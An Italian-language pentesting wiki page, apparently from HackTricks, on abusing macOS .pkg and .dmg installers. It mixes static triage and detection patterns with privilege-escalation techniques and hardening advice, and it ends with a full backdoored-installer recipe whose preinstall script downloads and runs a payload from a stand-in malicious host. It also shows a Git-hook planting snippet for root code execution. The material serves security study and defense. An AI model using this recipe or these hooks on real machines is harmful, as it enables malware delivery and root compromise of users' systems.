# Abuso degli installer di macOS

{{#include ../../../banners/hacktricks-training.md}}

## Informazioni di base sui Pkg

Un **installer package** di macOS (noto anche come file `.pkg`) è un formato di file utilizzato da macOS per **distribuire software**. Questi file sono come una **scatola che contiene tutto ciò di cui un software** ha bisogno per essere installato ed eseguito correttamente.

Il file del pacchetto è un archivio che contiene una **gerarchia di file e directory che verranno installati sul computer** target. Può anche includere **script** per eseguire attività prima e dopo l'installazione, come configurare i file di configurazione o rimuovere le versioni precedenti del software.

### Struttura del pacchetto

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**: Personalizzazioni (titolo, testo di benvenuto…) e controlli degli script/dell'installazione
- **PackageInfo (xml)**: Informazioni, requisiti di installazione, posizione di installazione, percorsi degli script da eseguire
- **Bill of materials (bom)**: Elenco dei file da installare, aggiornare o rimuovere con i permessi dei file
- **Payload (CPIO archive gzip compressed)**: File da installare nella `install-location` indicata in PackageInfo
- **Scripts (CPIO archive gzip compressed)**: Script di pre e post installazione e altre risorse estratte in una directory temporanea per l'esecuzione.

### Decomprimere
```bash
# Tool to directly get the files inside a package
pkgutil --expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files in a more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
Per visualizzare i contenuti dell’installer senza decomprimerlo manualmente, puoi anche usare lo strumento gratuito [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/).

### Scorciatoie per il triage statico

Se l’obiettivo è l’analisi, cerca di **evitare di aprire prima il package con `Installer.app`**. Alcuni package possono eseguire codice non appena Installer li apre (ad esempio tramite `system.run()` o i plug-in dell’installer), quindi l’estrazione offline è generalmente il punto di partenza più sicuro.
```bash
PKG="Suspicious.pkg"
OUT="/tmp/pkg-audit"

# Preserve Distribution, scripts, resources and nested component pkgs
pkgutil --expand-full "$PKG" "$OUT"

# Signature / policy checks
pkgutil --check-signature "$PKG"
spctl -a -vv -t install "$PKG"

# Quick hunting: scripts, BOM contents and interesting primitives
find "$OUT" -type f \( -name preinstall -o -name postinstall \) -print -exec head -n 1 {} \;
find "$OUT" -type f \( -name Bom -o -name '*.bom' \) -exec lsbom -pf {} \; 2>/dev/null
xmllint --format "$OUT/Distribution" 2>/dev/null | sed -n '1,200p'
rg -n 'system\.(run|runOnce)|<script>|launchctl|osascript|curl|chmod 4[0-7]{3}|sudo -u |\$USER|\$HOME|/tmp/|/var/tmp/' "$OUT"
```
## Informazioni di base sui file DMG

I file DMG, o Apple Disk Images, sono un formato di file utilizzato da Apple macOS per le immagini disco. Un file DMG è essenzialmente un'**immagine disco montabile** (contiene il proprio filesystem) che include dati di blocchi grezzi, generalmente compressi e talvolta cifrati. Quando si apre un file DMG, macOS lo **monta come se fosse un disco fisico**, consentendo di accedere ai suoi contenuti.

> [!CAUTION]
> Si noti che gli installer **`.dmg`** supportano **così tanti formati** che in passato alcuni di essi, contenenti vulnerabilità, sono stati abusati per ottenere **l'esecuzione di codice nel kernel**.

### Struttura di un Disk Image

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

La gerarchia di un file DMG può variare in base al contenuto. Tuttavia, per i DMG di applicazioni, generalmente segue questa struttura:

- Livello superiore: è la radice del disk image. Spesso contiene l'applicazione e possibilmente un link alla cartella Applications.
- Application (.app): è l'applicazione vera e propria. In macOS, un'applicazione è generalmente un pacchetto che contiene numerosi file e cartelle individuali che costituiscono l'applicazione.
- Link Applications: è un collegamento alla cartella Applications in macOS. Lo scopo è semplificare l'installazione dell'applicazione. È possibile trascinare il file .app su questo collegamento per installare l'app.

## Privesc tramite abuso di pkg

### Esecuzione da directory pubbliche

Se uno script di pre- o post-installazione esegue un file come **`/var/tmp/Installerutil`** e un attacker può sostituire quel file, può effettuare privilege escalation quando l'installer lo invoca. I talk e i walkthrough citati mostrano varianti di questo pattern insicuro basato su script esterni.<sup>[[1]](#references)</sup><sup>[[3]](#references)</sup><sup>[[4]](#references)</sup>

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

Questa è una [public function](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg) che diversi installer e updater chiamano per **eseguire qualcosa come root**. Questa funzione accetta come parametro il **path** del **file** da **eseguire**; tuttavia, se un attacker potesse **modificare** questo file, sarebbe in grado di **abusare** della sua esecuzione con privilegi root per **effettuare privilege escalation**.
```bash
# Breakpoint in the function to check which file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this misconfig
```
Per ulteriori informazioni, consulta questo talk: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)<sup>[[8]](#references)</sup>

### Abuso dell'ambiente e dello shebang

I moderni bug di PackageKit hanno dimostrato che gli script degli installer vengono spesso eseguiti come **codice root attendibile**, pur mantenendo nelle vicinanze un contesto controllato dall'attaccante. Durante l'audit dei pacchetti dei vendor, presta particolare attenzione a:

- Interpreti shell come `#!/bin/zsh` / `#!/bin/bash`
- Chiamate come `sudo -u $USER`, `launchctl asuser` o qualsiasi logica che si fidi di `$USER`, `$HOME`, `PATH`, `TMPDIR` o di percorsi relativi
- Interpreti non-shell che potrebbero caricare file di inizializzazione o librerie controllati dall'utente
```bash
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec sh -c 'printf "\n### %s\n" "$1"; head -n 1 "$1"' sh {} \;
rg -n '^#!/bin/(zsh|bash)|sudo -u |launchctl asuser|\$USER|\$HOME|PATH=|/usr/bin/env ' /tmp/target-pkg
```
Per il bug di root environment di PackageKit del 2024 (ereditarietà di `~/.zshenv` / `~/.bash*` durante le installazioni avviate dall'utente), consulta [la pagina generica sul privesc in macOS](../macos-privilege-escalation.md). Se il package è **firmato da Apple**, lo stesso bug nello script può diventare rilevante per **SIP/TCC**, perché `system_installd` può avere `com.apple.rootless.install.heritable`; consulta [la pagina su SIP](../macos-security-protections/macos-sip.md).<sup>[[5]](#references)</sup><sup>[[6]](#references)</sup>

### Input stateful e callback impliciti

Non limitare la review all'injection di comandi ovvia. Un `preinstall`/`postinstall` root può attraversare un confine di fiducia ogni volta che utilizza **stato esistente prima dell'installazione**: file prevedibili in `/tmp` o `/var/tmp`, un installation tree esistente e scrivibile dall'utente, file di configurazione, metadata del repository o un username passato successivamente a `chown`.<sup>[[9]](#references)[[10]](#references)</sup>

Due recenti flaw negli installer di Homebrew illustrano varianti riutilizzabili:

- **Ownership selezionata dall'attaccante:** un override dell'utente del package veniva letto dal percorso prevedibile `/var/tmp/.homebrew_pkg_user.plist` senza validarne owner, mode, ACL, stato dei symlink o provenienza. Un utente con pochi privilegi poteva selezionare il proprio account e un successivo `postinstall` root trasferiva ricorsivamente l'ownership dell'albero di Homebrew e della cache a quell'account. Si trattava di un flaw di assegnazione dei privilegi, non di shell injection.<sup>[[9]](#references)</sup>
- **Callback degli strumenti da un tree esistente:** un `postinstall` root eseguiva `git checkout` all'interno di un'installazione resa intenzionalmente scrivibile dal suo utente normale. Inserire un `.git/hooks/post-checkout` eseguibile trasformava quindi un successivo package upgrade tramite GUI/MDM in code execution come root. Nel percorso Intel, il merge della directory `.git` inclusa nel package nel repository esistente preservava inoltre gli hook aggiunti dall'attaccante.<sup>[[10]](#references)</sup>

La seconda primitive è facile da modellare durante un test autorizzato; il trigger si verifica solo quando il privileged installer vulnerabile esegue in seguito un'operazione Git in grado di attivare hook.<sup>[[10]](#references)</sup>
```bash
repo=/path/to/user-writable/install
mkdir -p "$repo/.git/hooks"
cat > "$repo/.git/hooks/post-checkout" <<'EOF'
#!/bin/sh
id > /tmp/pkg-post-checkout-context
EOF
chmod +x "$repo/.git/hooks/post-checkout"
# Wait for the privileged .pkg install/upgrade; do not invoke it as root just to test.
```
Espandi i pacchetti annidati e mappa ogni sorgente controllata dall'attaccante verso un sink privilegiato. Oltre all'esecuzione diretta, cerca parser, modifiche alla proprietà e strumenti con meccanismi di plug-in/hook.<sup>[[9]](#references)[[10]](#references)</sup>
```bash
PKG=Target.pkg
OUT=$(mktemp -d)
pkgutil --expand-full "$PKG" "$OUT"
grep -RniE '(/var/tmp|/tmp|defaults[[:space:]]+read|PlistBuddy|chown[[:space:]]+-R)' "$OUT"
grep -RniE '(^|[;&|[:space:]])(git|svn|hg|npm|pip|ruby|python)[[:space:]]' "$OUT"
grep -RniE '(checkout|reset|submodule|hooksPath|GIT_(DIR|CONFIG)|PYTHONPATH|RUBYOPT)' "$OUT"
```
Per l’hardening, sposta gli input privilegiati in una directory di staging di proprietà di root e valida ogni path immediatamente prima dell’uso (file regolare, owner/mode previsti, nessuna ACL non sicura e nessun attraversamento di symlink). Evita di modificare ricorsivamente la ownership partendo da un’identità non trusted. Quando Git deve essere eseguito su un tree preesistente, disabilita esplicitamente le callback (ad esempio, `git -c core.hooksPath=/dev/null ...`) oppure sostituisci atomicamente i metadata del repository prima di invocare Git.<sup>[[9]](#references)[[10]](#references)</sup>

### Esecuzione tramite mounting

Se un installer scrive in `/tmp/fixedname/bla/bla`, è possibile **creare un mount** sopra `/tmp/fixedname` con noowners, in modo da poter **modificare qualsiasi file durante l’installazione** per abusare del processo di installazione.

Un esempio è **CVE-2021-26089**, che è riuscito a **sovrascrivere uno script periodico** per ottenere l’esecuzione come root. Per ulteriori informazioni, guarda il talk: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)<sup>[[7]](#references)</sup>

## pkg come malware

### Payload vuoto

È possibile semplicemente generare un file **`.pkg`** con **script pre e post-installazione**, senza alcun payload reale oltre al malware contenuto negli script.<sup>[[2]](#references)</sup>

### JS nel Distribution xml

È possibile aggiungere tag **`<script>`** nel file **distribution xml** del package; tale codice verrà eseguito e potrà **eseguire comandi** usando **`system.run`**:

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

Nei distribution package questo dipende solitamente dal file `Distribution` di livello superiore che abilita gli script esterni, ad esempio con `allow-external-scripts="true"`. Di conseguenza, esaminare solo `preinstall` / `postinstall` non è sufficiente: lo stesso **Distribution XML** può contenere hook `installation-check` / `volume-check` e percorsi di esecuzione diretta tramite `system.run()` / `system.runOnce()`.
```bash
xmllint --format Distribution | sed -n '1,200p'
rg -n 'allow-external-scripts|system\.(run|runOnce)|installation-check|volume-check|function ' Distribution
```
### Installer con backdoor

Installer malevolo che utilizza uno script e codice JS all'interno di dist.xml
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options allow-external-scripts="true" customize="allow" require-scripts="true"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Build final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## References

- [1] [DEF CON 27 - Scompattare i Pkg: uno sguardo all'interno dei pacchetti Installer di macOS e alle comuni falle di sicurezza](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [2] [OBTS v4.0: "Il mondo selvaggio degli Installer di macOS" - Tony Lambert](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [3] [DEF CON 27 - Scompattare i Pkg: uno sguardo all'interno dei pacchetti Installer di macOS](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [4] [RedTeamRecipe – Red Teaming su macOS: sfruttare i pacchetti Installer](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
- [5] [CVE-2024-27822: escalation dei privilegi di PackageKit su macOS](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [6] [Violazione di SIP con pacchetti firmati da Apple](https://www.l3harris.com/newsroom/editorial/2024/03/breaking-sip-apple-signed-packages)
- [7] [OBTS v4.0: "Montagna di bug" - Csaba Fitzl](https://www.youtube.com/watch?v=jSYPazD4VcE)
- [8] [DEF CON 25 - Patrick Wardle - La morte per 1000 Installer su macOS e tutto è rotto!](https://www.youtube.com/watch?v=lTOItyjTTkw)
- [9] [L'Installer di Homebrew per macOS si fida di un plist package-user controllato dall'utente](https://github.com/Homebrew/brew/security/advisories/GHSA-59v8-x8q4-px5c)
- [10] [Esecuzione di codice come root tramite Git hooks in un postinstall PKG su macOS](https://github.com/Homebrew/brew/security/advisories/GHSA-6689-q779-c33m)
{{#include ../../../banners/hacktricks-training.md}}
